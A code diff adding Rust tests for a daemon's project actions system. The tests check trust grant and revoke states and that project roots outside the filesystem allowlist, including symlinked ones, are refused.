+        // A remote keybindings rewrite holds the rules again.
+        ok(
+            r,
+            "keybindings_write",
+            json!({ "scope": "project", "document": bindings("mod+shift+b") }),
+        )
+        .await;
+        let files = ok(r, "actions_read_files", json!({})).await;
+        assert_eq!(files["projectKeybindingsTrust"]["state"], "changed");
+
+        // Partial revoke (camelCase request fields), then revoke-everything.
+        let revoked = ok(
+            r,
+            "actions_trust_revoke",
+            json!({ "request": { "actionIds": ["build"] } }),
+        )
+        .await;
+        assert_eq!(revoked["actions"][0]["state"], "untrusted");
+        assert_eq!(revoked["keybindings"]["state"], "changed");
+        let revoked = ok(r, "actions_trust_revoke", json!({ "request": null })).await;
+        assert_eq!(revoked["actions"][0]["state"], "untrusted");
+        assert_eq!(revoked["keybindings"]["state"], "untrusted");
+
+        let e = err(r, "actions_trust_grant", json!({})).await;
+        assert!(e.contains("`request` is required"), "{e}");
+    }
+
+    /// A project whose root is outside the allowlist — stored by any path,
+    /// e.g. raw `db_exec` — is refused before its `.ikenga/` is read or
+    /// written, including a root that is a symlink out of the allowlist.
+    #[tokio::test]
+    async fn a_project_root_outside_the_allowlist_is_refused() {
+        let d = daemon();
+        let r = &d.router;
+        project(&d, "out", &d.outside).await;
+        #[cfg(unix)]
+        {
+            let target = d.outside.join("other");
+            std::fs::create_dir_all(&target).unwrap();
+            symlink(&target, &d.allowed.join("link"));
+            project(&d, "linked", &d.allowed.join("link")).await;
+        }
+        // A root that no longer exists is the shared scope resolver's
+        // desktop refusal, before the guard is ever asked.
+        project(&d, "gone", &d.outside.join("new")).await;
+
+        let mut refused = vec!["out"];
+        if cfg!(unix) {
+            refused.push("linked");
+        }
+        for pid in refused {
+            for cmd in ["actions_read_files", "actions_trust_status"] {
+                let e = err(r, cmd, json!({ "projectId": pid })).await;
+                assert!(
+                    e.contains("outside the daemon's fs allowlist"),
+                    "{pid} {cmd}: {e}"
+                );
+            }
+            let e = err(
+                r,
+                "actions_write",
+                json!({ "scope": "project", "document": shell_actions("x"), "projectId": pid }),
+            )
+            .await;
+            assert!(
+                e.contains("outside the daemon's fs allowlist"),
+                "{pid}: {e}"
+            );
+            let e = err(r, "actions_trust_revoke", json!({ "projectId": pid })).await;
+            assert!(
+                e.contains("outside the daemon's fs allowlist"),
+                "{pid}: {e}"
+            );
+        }
+        assert!(!d.outside.join(".ikenga").exists());
+        assert!(!d.outside.join("other/.ikenga").exists());
+        assert!(!d.outside.join("new").exists());
+
+        let e = err(
+            r,
+            "actions_write",
+            json!({ "scope": "project", "document": shell_actions("x"), "projectId": "gone" }),
+        )
+        .await;
+        assert!(e.contains("project root is unavailable"), "{e}");
+        assert!(!d.outside.join("new").exists());
+    }
+
+    /// The daemon builds its manager without a notifier: no watcher is
+    /// started (so no `.ikenga/` is created to watch) and a trust change
+    /// emits nothing — there is no event channel.
+    #[tokio::test]
+    async fn the_daemon_manager_watches_nothing() {
+        let d = daemon();
+        let manager = super::daemon_actions(d.db.clone(), &d.data, d.home.clone(), d.guard.clone());
+        manager.refresh_watch().await.unwrap();
+        assert!(
+            !d.home.join(".ikenga").exists(),
+            "no watched dir was created"
+        );
+    }
+}
